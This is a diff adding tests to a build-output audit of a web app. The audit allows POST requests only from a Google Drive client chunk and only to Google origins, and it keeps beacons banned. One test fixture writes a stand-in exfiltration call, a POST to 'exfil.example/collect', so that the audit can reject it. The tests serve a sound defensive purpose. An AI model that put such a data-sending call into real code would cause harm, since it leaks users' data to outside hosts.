@@ -363,3 +363,47 @@ describe("audit:dist", () => {
     expect(result.status, result.stderr).toBe(0)
   })
 })
+
+// Todo 53 (Google Drive slot sync, user decision 2026-10-05): the Drive client is
+// a separate, lazily imported chunk (dist/assets/drive-client-<hash>.js). Only
+// that chunk may POST/PATCH and only to Google's sign-in and Drive API origins;
+// every other file keeps the same-origin-GET rule, and beacons/sockets/event
+// streams stay banned everywhere.
+describe("audit:dist cloud-sync chunk", () => {
+  const driveSnippet = [
+    `const s = document.createElement("script"); s.src = "https://accounts.google.com/gsi/client";`,
+    `const scope = "https://www.googleapis.com/auth/drive.appdata";`,
+    `fetch("https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart", { method: "POST", body })`,
+    `fetch("https://www.googleapis.com/drive/v3/files?spaces=appDataFolder")`
+  ].join("\n")
+
+  it("passes Google sign-in/Drive URLs and POST inside the drive-client chunk", () => {
+    const dir = makeCleanDist()
+    writeFileSync(join(dir, "assets", "drive-client-AbC_12.js"), driveSnippet)
+    const result = run(dir)
+    expect(result.status, result.stderr).toBe(0)
+  })
+
+  it("rejects the same Drive code anywhere else (e.g. the main bundle)", () => {
+    const dir = makeCleanDist()
+    writeFileSync(join(dir, "assets", "index-zz9.js"), driveSnippet)
+    const result = run(dir)
+    expect(result.status).toBe(1)
+  })
+
+  it("rejects a non-Google origin even inside the drive-client chunk", () => {
+    const dir = makeCleanDist()
+    writeFileSync(join(dir, "assets", "drive-client-x1.js"), `fetch("https://exfil.example/collect", { method: "POST" })`)
+    const result = run(dir)
+    expect(result.status).toBe(1)
+    expect(result.stderr).toContain("exfil.example")
+  })
+
+  it("still rejects beacons inside the drive-client chunk", () => {
+    const dir = makeCleanDist()
+    writeFileSync(join(dir, "assets", "drive-client-x2.js"), `navigator.sendBeacon("https://www.googleapis.com/x", d)`)
+    const result = run(dir)
+    expect(result.status).toBe(1)
+    expect(result.stderr).toContain("sendBeacon")
+  })
+})
